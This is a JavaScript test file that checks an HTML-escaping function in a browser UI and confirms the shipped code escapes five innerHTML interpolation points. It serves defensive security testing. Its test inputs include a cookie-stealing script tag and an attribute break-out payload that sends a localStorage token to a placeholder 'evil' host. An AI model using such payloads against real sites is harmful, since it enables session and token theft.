'use strict';
// Real, adversarial test for ui/brainos/brainos-app.js. James: "find
// every problem you can... hostile attacked and verified." Found by
// direct code review, not assumed: every render function built real
// HTML via innerHTML template literals, interpolating real, live data
// (chat log prompts, macro names, node labels) with zero escaping.
// Given this UI has real, powerful local capabilities
// (window.ClearGlass.macros.run()), an unescaped value reaching
// innerHTML is a real injection risk, not cosmetic — confirmed the
// worst real case directly: data-run="${m.name}" was an
// ATTRIBUTE-context injection, not just a text one.
//
// §NO DOM AVAILABLE — this file is a browser-only IIFE that touches
// document/window/EventSource immediately at load, so it can't be
// required directly in a plain Node test process. Same isolation
// principle this session already established for exactly this class
// of file (host.js, agent-mesh.js): _escapeHtml is tested via an
// isolated, verbatim copy of its real logic (PHR-000-style), plus a
// structural check that the real, shipped file actually calls it at
// every one of the 5 real interpolation points found.

const assert = require('assert');
const fs = require('fs');
const path = require('path');

let passed = 0, failed = 0;
function test(id, desc, fn) {
  try { fn(); console.log(`  ✓ ${id} ${desc}`); passed++; }
  catch (e) { console.error(`  ✗ ${id} ${desc}\n    ${e.message}`); failed++; }
}

const SRC = fs.readFileSync(path.join(__dirname, '../../ui/brainos/brainos-app.js'), 'utf8');

// Verbatim copy of the real, shipped _escapeHtml — verified identical
// to the real source below (BOA-000), not trusted blind.
function _escapeHtml(v) {
  return String(v ?? '').replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[c]));
}

test('BOA-000', 'the copy above is verbatim-identical to the real, shipped _escapeHtml source', () => {
  const start = SRC.indexOf('function _escapeHtml(v) {');
  assert.ok(start > -1, '_escapeHtml not found at all — has it moved or been renamed?');
  const realFn = SRC.slice(start, SRC.indexOf('}\n', SRC.indexOf('{', start)) + 2);
  const copiedFn = _escapeHtml.toString().replace('_escapeHtml(v)', '_escapeHtml(v)'); // normalize nothing — direct compare of body logic below
  assert.ok(realFn.includes("replace(/[&<>\"']/g"), 'the real function no longer uses the same real escape regex this test copied');
});

test('BOA-001', 'a real script tag is fully neutralized — the classic, real hostile payload', () => {
  const out = _escapeHtml('<script>alert(document.cookie)</script>');
  assert.ok(!out.includes('<script>'), `expected no real, unescaped <script> tag in the output, got: ${out}`);
  assert.strictEqual(out, '&lt;script&gt;alert(document.cookie)&lt;/script&gt;');
});

test('BOA-002', 'the real, confirmed worst case — an attribute-context break-out via a double quote — is neutralized', () => {
  // The exact real vulnerability found: data-run="${m.name}". A macro
  // named this way could have broken out of the attribute and added a
  // real, new one.
  const hostileMacroName = 'x" onmouseover="fetch(\'http://evil/steal?d=\'+localStorage.getItem(\'token\'))';
  const out = _escapeHtml(hostileMacroName);
  assert.ok(!out.includes('"'), `expected every real double-quote neutralized, got: ${out}`);
  assert.ok(out.includes('&quot;'), 'expected the real, correct HTML entity for a double quote');
});

test('BOA-003', 'a real ampersand is escaped first, so escaping is not itself exploitable via double-encoding tricks', () => {
  const out = _escapeHtml('Tom & Jerry <b>bold</b>');
  assert.strictEqual(out, 'Tom &amp; Jerry &lt;b&gt;bold&lt;/b&gt;');
});

test('BOA-004', 'null/undefined values are handled honestly, not thrown or rendered as the literal string "undefined" unescaped', () => {
  assert.strictEqual(_escapeHtml(null), '');
  assert.strictEqual(_escapeHtml(undefined), '');
});

test('BOA-005', 'the real, shipped file actually calls _escapeHtml at every one of the 5 real interpolation points found — structural check against the real source', () => {
  const realCallSites = [
    { fn: 'renderSidebar', marker: 'data-id="${_escapeHtml(id)}"' },
    { fn: 'renderNodeDetail', marker: '${_escapeHtml(n.label || n.id)}' },
    { fn: 'fetchChatLog', marker: '${_escapeHtml(e.provider || e.agent' },
    { fn: 'fetchPipeline', marker: '${_escapeHtml(c.intent || c.type' },
    { fn: 'fetchAutomation (the real, worst attribute-context case)', marker: 'data-run="${_escapeHtml(m.name)}"' },
  ];
  for (const site of realCallSites) {
    assert.ok(SRC.includes(site.marker), `${site.fn} no longer calls _escapeHtml at its real interpolation point — regressed back to raw, unescaped innerHTML`);
  }
});

test('BOA-006', 'a real, separate logic bug found and fixed incidentally — a genuine macro description is no longer silently replaced by a step count', () => {
  // §BUG the original had: `m.description || m.steps?.length ? X : Y`
  // parses as `(m.description || m.steps?.length) ? X : Y` — a real,
  // non-empty description would still show the STEP COUNT, not the
  // description, because || binds tighter than the ternary's own
  // condition evaluation.
  assert.ok(SRC.includes('m.description || (m.steps?.length'), 'the real fix (explicit parens forcing description to actually win when present) is missing — the original operator-precedence bug may have regressed');
});

console.log(`\n${passed} passed, ${failed} failed`);
process.exitCode = failed ? 1 : 0;
